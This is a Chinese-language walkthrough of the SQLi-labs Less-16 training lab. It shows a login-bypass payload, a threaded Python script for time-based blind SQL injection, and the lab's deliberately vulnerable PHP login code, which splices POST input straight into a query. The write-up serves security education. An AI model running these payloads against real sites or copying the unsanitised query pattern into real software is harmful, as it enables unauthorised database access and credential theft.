# Less-16 **POST Blind- Time Based- Double quotes- String**
TAG：POST型注入、基于时间的注入、字符型注入、DNSLOG注入
## 漏洞利用  
此less依旧存在万能密码:  
payload:```1") or 1=1#```  
但是仿造less15构造恶意语句并不会有报错信息，也就是说现在整个页面所有的回显点都被封堵了，结合less名的提示，可以进行基于时间的注入  
手动基于时间的注入在less9中有过演示，此处只提供基于时间注入的脚本  
```
import requests
import threading
url = ''
payload = ''

class TheThread(threading.Thread):
    def __init__(self,func,args=()):
        super(TheThread,self).__init__()
        self.func = func
        self.args = args
    def run(self):
        self.result = self.func(self.args)
    def get_result(self):
        try:
            return self.result
        except Exception:
            return None

def payload(i):
    min = 65
    max = 122
    while abs(max - min) > 1:
        mid = (max + min)//2
        payload = url.format(_=i,__=mid)
        html = requests.post(url,data=payload)
        time = html.elapsed.total_seconds() #获取响应时间
        print(payload)
        if time >=5:
            min = mid
        else:
            max = mid
    return chr(max)
li = []

def main():
    flag = ''
    for i in range(1, 9):  # 循环次数根据所探测数据
        t = TheThread(payload,args=i)
        li.append(t)
        t.start()
    for t in li:
        t.join()
        flag += t.get_result()
        print(flag)
if __name__ == '__main__':
    main()
```
此less也可以进行DNSLOG注入，方法与less9相似  

## 源码分析  
### less16源码：  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Less-16- Blind- Time Based- Double quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"> Welcome&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br></div>

<div  align="center" style="margin:40px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;">

<div style="padding-top:10px; font-size:15px;">
 

<!--Form to post the data for sql injections Error based SQL Injection-->
<form action="" name="form1" method="post">
	<div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
	    <input type="text"  name="uname" value=""/>
	</div>  
	<div> Password  : &nbsp;&nbsp;&nbsp;
		<input type="text" name="passwd" value=""/>
	</div></br>
	<div style=" margin-top:9px;margin-left:90px;">
		<input type="submit" name="submit" value="Submit" />
	</div>
</form>

</div></div>

<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">
<font size="6" color="#FFFF00">





<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))
{
	$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];

	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'User Name:'.$uname."\n");
	fwrite($fp,'Password:'.$passwd."\n");
	fclose($fp);


	// connectivity
	$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);

	if($row)
	{
  		//echo '<font color= "#0000ff">';	
  		
  		echo "<br>";
		echo '<font color= "#FFFF00" font size = 4>';
		//echo " You Have successfully logged in " ;
		echo '<font size="3" color="#0000ff">';	
		echo "<br>";
		//echo 'Your Login name:'. $row['username'];
		echo "<br>";
		//echo 'Your Password:' .$row['password'];
		echo "<br>";
		echo "</font>";
		echo "<br>";
		echo "<br>";
		echo '<img src="../images/flag.jpg"  />';	
		
  		echo "</font>";
  	}
	else  
	{
		echo '<font color= "#0000ff" font size="3">';
		echo "</br>";
		echo "</br>";
		//echo "Try again looser";
		//print_r(mysql_error());
		echo "</br>";
		echo "</br>";
		echo "</br>";
		echo '<img src="../images/slap.jpg"  />';	
		echo "</font>";  
	}
}

?>


</font>
</div>
</body>
</html>

```
### 漏洞点分析：  
从此less的代码来看，并不存在查询结果与报错信息的输出，也不会在查询后对查询结果的正确与否进行显示，但是缺失相应的过滤措施导致了基于时间的注入与DNSLOG注入  